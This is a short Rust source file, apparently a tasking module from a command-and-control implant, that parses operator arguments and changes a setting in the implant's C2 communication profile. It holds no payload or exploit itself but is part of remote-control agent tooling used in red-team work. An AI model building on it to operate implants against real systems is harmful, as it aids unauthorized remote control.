use crate::profiles;
use crate::structs::Task;
use serde::Deserialize;

#[derive(Deserialize)]
struct UpdateC2Args {
    profile_name: String,
    key: String,
    value: String,
}

pub async fn execute(task: Task) {
    let mut response = task.new_response();
    let args: UpdateC2Args = match serde_json::from_str(&task.data.params) {
        Ok(a) => a,
        Err(e) => {
            response.set_error(&format!("Failed to parse: {}", e));
            let _ = task.job.send_responses.send(response).await;
            let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
            return;
        }
    };
    profiles::update_c2_profile(&args.profile_name, &args.key, &args.value);
    response.user_output = format!("Updated {}.{} = {}", args.profile_name, args.key, args.value);
    response.completed = true;
    let _ = task.job.send_responses.send(response).await;
    let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
}
